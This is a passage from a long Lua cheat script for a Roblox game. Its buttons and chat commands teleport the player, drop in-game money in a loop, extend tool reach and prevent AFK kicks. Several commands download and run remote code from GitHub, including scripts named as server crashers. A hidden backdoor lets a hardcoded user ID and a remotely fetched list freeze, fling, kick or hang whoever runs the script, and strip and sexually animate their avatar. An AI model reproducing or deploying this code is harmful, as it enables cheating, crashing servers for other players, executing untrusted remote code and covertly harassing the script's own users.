                                    game.Workspace:FindFirstChild(TazerTarget):FindFirstChild("UpperTorso")
                                if ei then
                                    eh.Position = ei.Position
                                end
                            end
                        end
                    end
                    if GrenadeTarget ~= nil then
                        print("lookin")
                        local ej = game.Workspace["Ignored"]:FindFirstChild("Handle")
                        local ei = b:FindFirstChild(GrenadeTarget)
                        if ej and ei then
                            if ei.Character then
                                ej.Position = ei.Character.UpperTorso.Position
                            end
                        end
                    end
                end
                local dh = function()
                    dg = game:GetService("RunService").Heartbeat:Connect(df)
                end
                local di = function()
                    dg:Disconnect()
                end
                dh()
                repeat
                    wait()
                until not c.Character or c.Character:FindFirstChildOfClass("Humanoid").Died == true
                di()
            end
        )
        ba.MouseButton1Click:Connect(
            function()
                local ek = Instance.new("Folder", game:GetService("Workspace"))
                local el = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPack
                local ScrollingFrame = el.ScrollingFrame
                local em = el.CloseButton
                el.Visible = true
                local en = Instance.new("Animation", ek)
                en.Name = "LeanAnimation"
                en.AnimationId = "rbxassetid://3152375249"
                local eo = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(en)
                local ep = Instance.new("Animation", ek)
                ep.Name = "LayAnimation"
                ep.AnimationId = "rbxassetid://3152378852"
                local eq = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(ep)
                local er = Instance.new("Animation", ek)
                er.Name = "Dance1Animation"
                er.AnimationId = "rbxassetid://3189773368"
                local es = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(er)
                local et = Instance.new("Animation", ek)
                et.Name = "Dance2Animation"
                et.AnimationId = "rbxassetid://3189776546"
                local eu = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(et)
                local ev = Instance.new("Animation", ek)
                ev.Name = "GreetAnimation"
                ev.AnimationId = "rbxassetid://3189777795"
                local ew = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(ev)
                local ex = Instance.new("Animation", ek)
                ex.Name = "PrayingAnimation"
                ex.AnimationId = "rbxassetid://3487719500"
                local ey = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(ex)
                for s, O in pairs(ScrollingFrame:GetChildren()) do
                    if O.Name == "TextButton" then
                        if O.Text == "Lean" then
                            O.Name = "LeanButton"
                        end
                    end
                end
                for s, O in pairs(ScrollingFrame:GetChildren()) do
                    if O.Name == "TextButton" then
                        if O.Text == "Lay" then
                            O.Name = "LayButton"
                        end
                    end
                end
                for s, O in pairs(ScrollingFrame:GetChildren()) do
                    if O.Name == "TextButton" then
                        if O.Text == "Dance1" then
                            O.Name = "Dance1Button"
                        end
                    end
                end
                for s, O in pairs(ScrollingFrame:GetChildren()) do
                    if O.Name == "TextButton" then
                        if O.Text == "Dance2" then
                            O.Name = "Dance2Button"
                        end
                    end
                end
                for s, O in pairs(ScrollingFrame:GetChildren()) do
                    if O.Name == "TextButton" then
                        if O.Text == "Greet" then
                            O.Name = "GreetButton"
                        end
                    end
                end
                for s, O in pairs(ScrollingFrame:GetChildren()) do
                    if O.Name == "TextButton" then
                        if O.Text == "Praying" then
                            O.Name = "PrayingButton"
                        end
                    end
                end
                function Stop()
                    eq:Stop()
                    eo:Stop()
                    es:Stop()
                    eu:Stop()
                    ew:Stop()
                    ey:Stop()
                end
                local ez = ScrollingFrame.LeanButton
                local eA = ScrollingFrame.LayButton
                local eB = ScrollingFrame.Dance1Button
                local eC = ScrollingFrame.Dance2Button
                local eD = ScrollingFrame.GreetButton
                local eE = ScrollingFrame.PrayingButton
                el.MouseButton1Click:Connect(
                    function()
                        if ScrollingFrame.Visible == false then
                            ScrollingFrame.Visible = true
                            em.Visible = true
                        end
                    end
                )
                em.MouseButton1Click:Connect(
                    function()
                        if ScrollingFrame.Visible == true then
                            ScrollingFrame.Visible = false
                            em.Visible = false
                        end
                    end
                )
                ez.MouseButton1Click:Connect(
                    function()
                        Stop()
                        eo:Play()
                    end
                )
                eA.MouseButton1Click:Connect(
                    function()
                        Stop()
                        eq:Play()
                    end
                )
                eB.MouseButton1Click:Connect(
                    function()
                        Stop()
                        es:Play()
                    end
                )
                eC.MouseButton1Click:Connect(
                    function()
                        Stop()
                        eu:Play()
                    end
                )
                eD.MouseButton1Click:Connect(
                    function()
                        Stop()
                        ew:Play()
                    end
                )
                eE.MouseButton1Click:Connect(
                    function()
                        Stop()
                        ey:Play()
                    end
                )
                game:GetService("Players").LocalPlayer.Character.Humanoid.Running:Connect(
                    function()
                        Stop()
                    end
                )
                game:GetService("Players").LocalPlayer.Character.Humanoid.Died:Connect(
                    function()
                        Stop()
                        repeat
                            wait()
                        until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 100
                        wait(1)
                        local el = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPack
                        local ScrollingFrame = el.ScrollingFrame
                        local em = el.CloseButton
                        el.Visible = true
                        local en = Instance.new("Animation", ek)
                        en.Name = "LeanAnimation"
                        en.AnimationId = "rbxassetid://3152375249"
                        local eo = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(en)
                        local ep = Instance.new("Animation", ek)
                        ep.Name = "LayAnimation"
                        ep.AnimationId = "rbxassetid://3152378852"
                        local eq = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(ep)
                        local er = Instance.new("Animation", ek)
                        er.Name = "Dance1Animation"
                        er.AnimationId = "rbxassetid://3189773368"
                        local es = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(er)
                        local et = Instance.new("Animation", ek)
                        et.Name = "Dance2Animation"
                        et.AnimationId = "rbxassetid://3189776546"
                        local eu = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(et)
                        local ev = Instance.new("Animation", ek)
                        ev.Name = "GreetAnimation"
                        ev.AnimationId = "rbxassetid://3189777795"
                        local ew = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(ev)
                        local ex = Instance.new("Animation", ek)
                        ex.Name = "PrayingAnimation"
                        ex.AnimationId = "rbxassetid://3487719500"
                        local ey = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(ex)
                        for s, O in pairs(ScrollingFrame:GetChildren()) do
                            if O.Name == "TextButton" then
                                if O.Text == "Lean" then
                                    O.Name = "LeanButton"
                                end
                            end
                        end
                        for s, O in pairs(ScrollingFrame:GetChildren()) do
                            if O.Name == "TextButton" then
                                if O.Text == "Lay" then
                                    O.Name = "LayButton"
                                end
                            end
                        end
                        for s, O in pairs(ScrollingFrame:GetChildren()) do
                            if O.Name == "TextButton" then
                                if O.Text == "Dance1" then
                                    O.Name = "Dance1Button"
                                end
                            end
                        end
                        for s, O in pairs(ScrollingFrame:GetChildren()) do
                            if O.Name == "TextButton" then
                                if O.Text == "Dance2" then
                                    O.Name = "Dance2Button"
                                end
                            end
                        end
                        for s, O in pairs(ScrollingFrame:GetChildren()) do
                            if O.Name == "TextButton" then
                                if O.Text == "Greet" then
                                    O.Name = "GreetButton"
                                end
                            end
                        end
                        for s, O in pairs(ScrollingFrame:GetChildren()) do
                            if O.Name == "TextButton" then
                                if O.Text == "Praying" then
                                    O.Name = "PrayingButton"
                                end
                            end
                        end
                        function Stop()
                            eq:Stop()
                            eo:Stop()
                            es:Stop()
                            eu:Stop()
                            ew:Stop()
                            ey:Stop()
                        end
                        local ez = ScrollingFrame.LeanButton
                        local eA = ScrollingFrame.LayButton
                        local eB = ScrollingFrame.Dance1Button
                        local eC = ScrollingFrame.Dance2Button
                        local eD = ScrollingFrame.GreetButton
                        local eE = ScrollingFrame.PrayingButton
                        el.MouseButton1Click:Connect(
                            function()
                                if ScrollingFrame.Visible == false then
                                    ScrollingFrame.Visible = true
                                    em.Visible = true
                                end
                            end
                        )
                        em.MouseButton1Click:Connect(
                            function()
                                if ScrollingFrame.Visible == true then
                                    ScrollingFrame.Visible = false
                                    em.Visible = false
                                end
                            end
                        )
                        ez.MouseButton1Click:Connect(
                            function()
                                Stop()
                                eo:Play()
                            end
                        )
                        eA.MouseButton1Click:Connect(
                            function()
                                Stop()
                                eq:Play()
                            end
                        )
                        eB.MouseButton1Click:Connect(
                            function()
                                Stop()
                                es:Play()
                            end
                        )
                        eC.MouseButton1Click:Connect(
                            function()
                                Stop()
                                eu:Play()
                            end
                        )
                        eD.MouseButton1Click:Connect(
                            function()
                                Stop()
                                ew:Play()
                            end
                        )
                        eE.MouseButton1Click:Connect(
                            function()
                                Stop()
                                ey:Play()
                            end
                        )
                    end
                )
            end
        )
        c0.Visible = false
        bZ.MouseButton1Click:Connect(
            function()
                if tonumber(bX.Text) ~= nil then
                    bX.Text = tostring(math.floor(tonumber(bX.Text) * 1.42857))
                    local eF = tonumber(bX.Text)
                    cashgoal = c.DataFolder.Currency.Value - eF
                    c1.Text = "Cash At End : $" .. cT(cashgoal)
                else
                    announce("insert number", "", 3)
                end
            end
        )
        b_.MouseButton1Click:Connect(
            function()
                if b_.Text == "Enable" and tonumber(bX.Text) ~= nil then
                    b_.Text = "Stop"
                    while b_.Text == "Stop" do
                        wait()
                        MainEvent:FireServer("DropMoney", "10000")
                        if c.DataFolder.Currency.Value <= cashgoal then
                            b_.Text = "Enable"
                            announce("finished dropping")
                        end
                    end
                else
                    b_.Text = "Enable"
                end
            end
        )
        c4.MouseButton1Click:Connect(
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
                wait(0.1)
                wait(0.5)
                local eG = Instance.new("ScreenGui")
                local eH = Instance.new("TextLabel")
                local eI = Instance.new("Frame")
                local eJ = Instance.new("TextLabel")
                local eK = Instance.new("TextLabel")
                eG.Parent = game.CoreGui
                eG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                eH.Parent = eG
                eH.Active = true
                eH.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
                eH.Draggable = true
                eH.Position = UDim2.new(0.698610067, 0, 0.098096624, 0)
                eH.Size = UDim2.new(0, 370, 0, 52)
                eH.Font = Enum.Font.SourceSansSemibold
                eH.Text = "Anti Afk"
                eH.TextColor3 = Color3.new(0, 1, 1)
                eH.TextSize = 22
                eI.Parent = eH
                eI.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
                eI.Position = UDim2.new(0, 0, 1.0192306, 0)
                eI.Size = UDim2.new(0, 370, 0, 107)
                eJ.Parent = eI
                eJ.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
                eJ.Position = UDim2.new(0, 0, 0.800455689, 0)
                eJ.Size = UDim2.new(0, 370, 0, 21)
                eJ.Font = Enum.Font.Arial
                eJ.Text = "Made by luca#5432"
                eJ.TextColor3 = Color3.new(0, 1, 1)
                eJ.TextSize = 20
                eK.Parent = eI
                eK.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
                eK.Position = UDim2.new(0, 0, 0.158377, 0)
                eK.Size = UDim2.new(0, 370, 0, 44)
                eK.Font = Enum.Font.ArialBold
                eK.Text = "Status: Active"
                eK.TextColor3 = Color3.new(0, 1, 1)
                eK.TextSize = 20
                local eL = game:service "VirtualUser"
                game:service "Players".LocalPlayer.Idled:connect(
                    function()
                        eL:CaptureController()
                        eL:ClickButton2(Vector2.new())
                        eK.Text = "Roblox tried kicking you buy I didnt let them!"
                        wait(2)
                        eK.Text = "Status : Active"
                    end
                )
            end
        )
        aL.MouseButton1Click:Connect(
            function()
                if c.Character then
                    if aL.Text == "SetSpawn" then
                        aL.Text = "NoSpawn"
                        SpawnPosition = c.Character.HumanoidRootPart.CFrame
                    else
                        aL.Text = "SetSpawn"
                        SpawnPosition = nil
                    end
                end
            end
        )
        aI.MouseButton1Click:Connect(
            function()
                if PreviousPosition ~= nil then
                    c.Character.HumanoidRootPart.CFrame = PreviousPosition
                else
                    announce("Previous Position Error", "you need to have tped before to return to an old position", 5)
                end
            end
        )
        aJ.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    -437.125885,
                    38.9783134,
                    -285.587372,
                    0.0165725499,
                    5.298579e-08,
                    -0.99986279,
                    1.16139711e-08,
                    1,
                    5.31855591e-08,
                    0.99986279,
                    -1.24937944e-08,
                    0.0165725499
                )
            end
        )
        aN.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    -259.516907,
                    22.1498718,
                    -762.971558,
                    0.992310345,
                    0,
                    0.12377467,
                    0,
                    1,
                    0,
                    -0.12377467,
                    0,
                    0.992310345
                )
            end
        )
        aP.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    -796.256897,
                    -39.6492004,
                    -886.306152,
                    -0.39699012,
                    2.91068263e-05,
                    0.917822897,
                    1.63490836e-06,
                    1,
                    -3.10057476e-05,
                    -0.917822897,
                    -1.08084187e-05,
                    -0.39699012
                )
            end
        )
        aV.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    -591.085022,
                    8.31477833,
                    -742.803528,
                    0.994070172,
                    5.60480942e-08,
                    0.108740292,
                    -6.51724079e-08,
                    1,
                    8.03552425e-08,
                    -0.108740292,
                    -8.69656134e-08,
                    0.994070172
                )
            end
        )
        aH.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    488.347412,
                    48.0705032,
                    -630.454285,
                    -0.0453165509,
                    -4.20173549e-08,
                    -0.998972654,
                    -4.23235385e-08,
                    1,
                    -4.01406339e-08,
                    0.998972654,
                    4.04610248e-08,
                    -0.0453165509
                )
            end
        )
        aM.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    111.514938,
                    -26.7500305,
                    -276.918365,
                    -0.997865558,
                    -1.25138016e-08,
                    -0.0653034225,
                    -1.74378947e-08,
                    1,
                    7.48333733e-08,
                    0.0653034225,
                    7.58124159e-08,
                    -0.997865558
                )
            end
        )
        aO.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    591.680725,
                    49.0000458,
                    -256.818298,
                    -0.0874911696,
                    -3.41755495e-08,
                    -0.996165276,
                    1.23318324e-08,
                    1,
                    -3.53901868e-08,
                    0.996165276,
                    -1.53808717e-08,
                    -0.0874911696
                )
            end
        )
        aT.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    583.931641,
                    51.061409,
                    -476.954193,
                    -0.999745369,
                    1.49123665e-08,
                    -0.0225663595,
                    1.44838328e-08,
                    1,
                    1.91533687e-08,
                    0.0225663595,
                    1.88216429e-08,
                    -0.999745369
                )
            end
        )
        aS.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    71.7331619,
                    139,
                    -691.154419,
                    0.602706313,
                    7.78292178e-06,
                    0.797962964,
                    7.63640458e-07,
                    1,
                    -1.03302691e-05,
                    -0.797962964,
                    6.83547478e-06,
                    0.602706313
                )
            end
        )
        aK.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    -117.270287,
                    -58.7000618,
                    146.536087,
                    0.999873519,
                    5.21876942e-08,
                    -0.0159031227,
                    -5.22713037e-08,
                    1,
                    -4.84179008e-09,
                    0.0159031227,
                    5.67245495e-09,
                    0.999873519
                )
            end
        )
        aR.MouseButton1Click:Connect(
            function()
                PreviousPosition = c.Character.HumanoidRootPart.CFrame
                c.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    207.48085,
                    38.25,
                    200014.953,
                    0.507315397,
                    0,
                    -0.861760437,
                    0,
                    1,
                    0,
                    0.861760437,
                    0,
                    0.507315397
                )
            end
        )
        aQ.MouseButton1Click:Connect(
            function()
                SavedPos = c.Character.HumanoidRootPart.CFrame
            end
        )
        aU.MouseButton1Click:Connect(
            function()
                if SavedPos ~= nil then
                    c.Character.HumanoidRootPart.CFrame = SavedPos
                else
                    announce("Load Position Error", "you need to save a position first", 4)
                end
            end
        )
        local eM = {878675}
        local eN = false
        local eO = "PERMA BANNED"
        local function eP(i, Q)
            if DisableMod == false or table.find(eM, Q) then
                local eQ = game:GetService("Players"):GetPlayerByUserId(Q)
                local eR = string.lower(i)
                local eS = string.split(eR, " ")
                local eT = string.lower(c.Name)
                local eU = string.find(eT, eS[2])
                if eU then
                    if string.find(eS[1], ":freeze") then
                        c.Character.HumanoidRootPart.Anchored = true
                    end
                    if string.find(eS[1], ":thaw") then
                        c.Character.HumanoidRootPart.Anchored = false
                    end
                    if string.find(eS[1], ":benx") then
                        eN = true
                        local eV = eQ.Name
                        local eW =
                            c.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(
                            game:GetService("ReplicatedStorage").ClientAnimations.Crouching
                        )
                        eW.Looped = true
                        eW:Play()
                        local eX = .5
                        local eY = false
                        local eZ = c.Character:FindFirstChild("Shirt")
                        local e_ = c.Character:FindFirstChild("Pants")
                        if eZ then
                            eZ:Destroy()
                        end
                        if e_ then
                            e_:Destroy()
                        end
                        local dg
                        local df = function()
                            local f0 = game.Workspace.Players:FindFirstChild(eV) or game.Workspace:FindFirstChild(eV)
                            local db = c.Character
                            if f0 then
                                if eY == true then
                                    eX = eX - 0.1
                                else
                                    eX = eX + 0.1
                                end
                                if eX >= 2 then
                                    eY = true
                                elseif eX < 0.5 then
                                    eY = false
                                end
                                db.HumanoidRootPart.CFrame =
                                    game.Players[eV].Character.HumanoidRootPart.CFrame +
                                    game.Players[eV].Character.HumanoidRootPart.CFrame.lookVector * eX
                            end
                        end
                        local dh = function()
                            dg = game:GetService("RunService").Heartbeat:Connect(df)
                        end
                        local di = function()
                            dg:Disconnect()
                            eW:Stop()
                        end
                        dh()
                        repeat
                            wait()
                        until eN == false
                        di()
                    end
                    if string.find(eS[1], ":unbenx") then
                        while eN == true do
                            wait()
                            eN = false
                        end
                    end
                    if string.find(eS[1], ":kick") then
                        local f1 = table.find(eM, c.UserId)
                        if not f1 then
                            eO = eQ.Name
                            c:Kick(eO)
                            wait(5)
                            while true do
                            end
                        end
                    end
                    if string.find(eS[1], ":bring") then
                        c.Character.HumanoidRootPart.CFrame =
                            CFrame.new(game.Workspace.Players:FindFirstChild(eQ.Name).HumanoidRootPart.Position)
                    end
                    if string.find(eS[1], ":cuffban") then
                        if table.find(eM, Q) then
                            local f1 = table.find(eM, c.UserId)
                            if not f1 then
                                c:Kick("Stop .")
                            end
                        end
                    end
                    if string.find(eS[1], ":fling") then
                        c.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
                    end
                else
                    if string.find(i, "/e test") then
                        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                            "yeah,yeah!",
                            "All"
                        )
                    end
                end
            end
        end
        muted = {}
        mutingnew = false
        local f2 = loadstring(game:HttpGet("https://raw.githubusercontent.com/swagmode/swagmode/main/modlist"))()
        b.PlayerAdded:Connect(
            function(Q)
                local f3 = table.find(eM, Q.UserId)
                if f3 or f2[Q.UserId] then
                    Q.Chatted:Connect(
                        function(i)
                            eP(i, Q.UserId)
                        end
                    )
                end
                if muteingnew == true then
                    if not table.find(muted, Q.Name) then
                        table.insert(muted, Q.Name)
                        print("automuted " .. Q.Name)
                    end
                end
            end
        )
        for s, O in pairs(game:GetService("Players"):GetChildren()) do
            local f3 = table.find(eM, O.UserId)
            if f3 or f2[O.UserId] then
                print("found")
                O.Chatted:Connect(
                    function(i)
                        eP(i, O.UserId)
                    end
                )
            end
        end
        local eP = {}
        local f4 = "/"
        local function f5(f6)
            for n, u in ipairs(b:GetPlayers()) do
                if string.lower(f6) == string.sub(string.lower(u.Name), 1, #f6) then
                    return u
                end
            end
        end
        eP.e = function(f7)
            local f8 = f7[1]
            if f8 == "rejoin" or f8 == "rj" then
                b.LocalPlayer:Kick("Rejoining")
                wait()
                game:GetService("TeleportService"):Teleport(game.PlaceId, b.LocalPlayer)
            end
            if f8 == "serverhop" or f8 == "shop" then
                local f9 = {}
                for n, O in ipairs(
                    game:GetService("HttpService"):JSONDecode(
                        game:HttpGetAsync(
                            "https://games.roblox.com/v1/games/" ..
                                game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
                        )
                    ).data
                ) do
                    if type(O) == "table" and O.maxPlayers > O.playing and O.id ~= game.JobId then
                        f9[#f9 + 1] = O.id
                    end
                end
                if #f9 > 0 then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, f9[math.random(1, #f9)])
                else
                    print("failed to find server")
                end
            end
            local fa = false
            if f8 == "animations" and c.PlayerGui.MainScreenGui.AnimationPack.Visible == false and fa == false then
                local cO = c.Character:FindFirstChildWhichIsA("Humanoid")
                fa = true
                local fb = Instance.new("Folder", game.Workspace)
                local fc = Instance.new("Animation", fb)
                fc.AnimationId = "rbxassetid://3152375249"
                local eo = cO:LoadAnimation(fc)
                local fd = Instance.new("Animation", fb)
                fd.AnimationId = "rbxassetid://3152378852"
                local eq = cO:LoadAnimation(fd)
                local fe = Instance.new("Animation", fb)
                fe.AnimationId = "rbxassetid://3189773368"
                local es = cO:LoadAnimation(fe)
                local ff = Instance.new("Animation", fb)
                ff.AnimationId = "rbxassetid://3189776546"
                local eu = cO:LoadAnimation(ff)
                local fg = Instance.new("Animation", fb)
                fg.AnimationId = "rbxassetid://3189777795"
                local ew = cO:LoadAnimation(fg)
                local fh = Instance.new("Animation", fb)
                fh.AnimationId = "rbxassetid://3487719500"
                local fi = cO:LoadAnimation(fh)
                Close.Visible = false
                ScrollingFrame.Visible = false
                Animations.Visible = true
                Animations.MouseButton1Click:Connect(
                    function()
                        ScrollingFrame.Visible = true
                        Close.Visible = true
                    end
                )
                Close.MouseButton1Click:Connect(
                    function()
                        ScrollingFrame.Visible = false
                        Close.Visible = false
                    end
                )
                LeanButton.MouseButton1Click:Connect(
                    function()
                        eo:Play()
                    end
                )
                LayButton.MouseButton1Click:Connect(
                    function()
                        eq:play()
                    end
                )
                Dance1Button.MouseButton1Click:Connect(
                    function()
                        es:Play()
                    end
                )
                Dance2Button.MouseButton1Click:Connect(
                    function()
                        eu:Play()
                    end
                )
                GreetButton.MouseButton1Click:Connect(
                    function()
                        ew:Play()
                    end
                )
                PrayButton.MouseButton1Click:Connect(
                    function()
                        fi:Play()
                    end
                )
                cO.Running:Connect(
                    function()
                        eo:Stop()
                        eq:Stop()
                        es:Stop()
                        eu:Stop()
                        ew:Stop()
                        fi:Stop()
                        ChestPump:Stop()
                    end
                )
            end
            if f8 == "korblox" then
                game:GetService("Workspace").Players:FindFirstChild(c.Name).RightLowerLeg:Destroy()
                game:GetService("Workspace").Players:FindFirstChild(c.Name).RightUpperLeg:Destroy()
                game:GetService("Workspace").Players:FindFirstChild(c.Name).RightFoot:Destroy()
            end
            if f8 == "crash" then
                loadstring(
                    game:HttpGet(
                        "https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher"
                    )
                )()
            end
            if f8 == "lettuce" then
                local cO = c.Character:FindFirstChildWhichIsA("Humanoid")
                local fj = Instance.new("Tool", c.Backpack)
                fj.RequiresHandle = false
                fj.CanBeDropped = true
                fj.Name = "Lettuce"
                fj.ToolTip = "inf lettuce eater yummy"
                local function fk()
                    local fl = c.Backpack:FindFirstChild("[Lettuce]")
                    if fl and c.Character.BodyEffects.Attacking.Value == false then
                        cO:EquipTool(fl)
                        c.Character:FindFirstChildWhichIsA("Tool"):Activate()
                        repeat
                            wait()
                        until c.Character.BodyEffects.Attacking.Value == false
                        cO:EquipTool(fj)
                    end
                end
                fj.Activated:Connect(
                    function()
                        fk()
                    end
                )
                fj.Equipped:Connect(
                    function()
                        while c.Character:FindFirstChild("Lettuce") do
                            wait()
                            local fm = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"].Head
                            local fn = c.Character:FindFirstChild("HumanoidRootPart")
                            if fn and c.Character:FindFirstChild("Lettuce") then
                                local fo = (fn.Position - fm.Position).Magnitude
                                if fo <= 30 then
                                    for s, O in pairs(c.Backpack:GetChildren()) do
                                        local cO = c.Character:FindFirstChildWhichIsA("Humanoid")
                                        if O.Name == "[Lettuce]" then
                                            O.Parent = c.Character
                                        end
                                    end
                                    fireclickdetector(fm.Parent:FindFirstChild("ClickDetector"))
                                end
                            end
                        end
                    end
                )
            end
            if f8 == "fov" then
                if game.Workspace:FindFirstChildWhichIsA("Camera") then
                    game.Workspace:FindFirstChildWhichIsA("Camera").FieldOfView = tonumber(f7[2])
                end
            end
            BRIGHT = false
            if f8 == "bright" or f8 == "unbright" then
                if BRIGHT == false then
                    BRIGHT = true
                    game:GetService("Lighting").GlobalShadows = false
                else
                    BRIGHT = false
                    game:GetService("Lighting").GlobalShadows = true
                end
            end
            if f8 == "tool" or f8 == "tools" then
                for s, O in pairs(game:GetService("Workspace").Ignored.ItemsDrop:GetChildren()) do
                    c.Character.HumanoidRootPart.CFrame = O.CFrame
                    wait(0.01)
                end
            end
            if f8 == "zoom" or f8 == "infzoom" then
                c.CameraMaxZoomDistance = math.huge
            end
            FOG = false
            if f8 == "fog" then
                if FOG == false then
                    FOG = true
                    game:GetService("Lighting").FogEnd = 5000
                else
                    FOG = false
                    game:GetService("Lighting").FogEnd = 500
                end
            end
            if f8 == "set" then
                local fp = f7[2]
                if fp then
                    local fq = f5(fp)
                    if fq then
                        am.Text = fq.Name
                        SetPlayerInfo()
                    end
                end
            end
            if f8 == "float" then
                if c.Character:FindFirstChildWhichIsA("Tool") then
                    if
                        c.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Handle"):FindFirstChildWhichIsA(
                            "BillboardGui"
                        )
                     then
                        c.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Handle"):FindFirstChildWhichIsA(
                            "BillboardGui"
                        ):Destroy()
                    end
                end
            end
            if f8 == "to" then
                local fr = f7[2]
                if fr then
                    local fs = f5(fr)
                    if fs then
                        game:GetService("Workspace").Players:WaitForChild(c.Name).HumanoidRootPart.CFrame =
                            game:GetService("Workspace").Players:WaitForChild(fs.Name).HumanoidRootPart.CFrame
                        if not c.Character.LeftHand:FindFirstChild("LeftWrist") then
                            c.Character.LeftHand.CFrame = c.Character.HumanoidRootPart.CFrame
                            c.Character.RightHand.CFrame = c.Character.HumanoidRootPart.CFrame
                        end
                    end
                end
            end
            if f8 == "sit" then
                game.Players.LocalPlayer.Character.Humanoid.Sit = true
            end
            if f8 == "recoil" then
                for s, O in pairs(game:GetService("Workspace"):GetChildren()) do
                    if O:IsA("Camera") then
                        O:Destroy()
                    end
                end
                local dd = Instance.new("Camera")
                dd.Parent = game:GetService("Workspace")
                dd.Name = "Camera"
                dd.CameraType = "Custom"
                dd.CameraSubject =
                    game:GetService("Workspace").Players:FindFirstChild(c.Name):FindFirstChild("Humanoid")
                dd.HeadLocked = true
                dd.HeadScale = 1
            end
            if f8 == "headless" then
                c.Character.Head:BreakJoints()
                c.Character.Head.Position = Vector3.new(0, 99999999999999, 0)
            end
            if f8 == "hideboombox" or f8 == "boombox" then
                c.Character.BOOMBOXHANDLE:Destroy()
            end
            if f8 == "reach" or f8 == "toolreach" then
                if c.Character:FindFirstChildWhichIsA("Tool") then
                    c.Character:FindFirstChildWhichIsA("Tool").Handle.Size = Vector3.new(50, 50, 50)
                    c.Character:FindFirstChildWhichIsA("Tool").Handle.Transparency = 1
                end
            end
            if f8 == "taser" then
                c.Character.HumanoidRootPart.CFrame = CFrame.new(-271.194, 21.8, -103.052)
                local fj = Instance.new("Tool", c.Backpack)
                fj.RequiresHandle = false
                fj.CanBeDropped = true
                fj.Name = "Taser"
                fj.ToolTip = "tazer"
                local function fk()
                    hold:Play()
                    for s, O in pairs(c.Backpack:GetChildren()) do
                        if O.Name == "[Taser]" then
                            O.Parent = c.Character
                        end
                    end
                    for s, O in pairs(c.Character:GetChildren()) do
                        if O.Name == "[Taser]" then
                            O:Activate()
                        end
                    end
                end
                fj.Activated:Connect(
                    function()
                        fk()
                    end
                )
                fj.Unequipped:Connect(
                    function()
                    end
                )
                fj.Equipped:Connect(
                    function()
                        while c.Character:FindFirstChild("Taser") do
                            local dj = 0
                            for s, O in pairs(c.Character:GetChildren()) do
                                if O.Name == "[Taser]" then
                                    dj = dj + 1
                                end
                            end
                            fj.ToolTip = tostring(dj)
                            wait(3)
                        end
                    end
                )
                coroutine.resume(
                    coroutine.create(
                        function()
                            local fm = game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].Head
                            while wait(0.05) do
                                local ft =
                                    game:GetService("Players"):FindFirstChild(c.Name).PlayerGui.MainScreenGui:FindFirstChild(
                                    "whiteScreen"
                                )
                                if ft then
                                    ft:Destroy()
                                end
                                local fn = c.Character:FindFirstChild("HumanoidRootPart")
                                if fn and c.Character:FindFirstChild("Taser") then
                                    local fo = (fn.Position - fm.Position).Magnitude
                                    if fo <= 30 then
                                        for s, O in pairs(c.Backpack:GetChildren()) do
                                            local cO = c.Character:FindFirstChildWhichIsA("Humanoid")
                                            if O.Name == "[Taser]" then
                                                O.Parent = c.Character
                                            end
                                        end
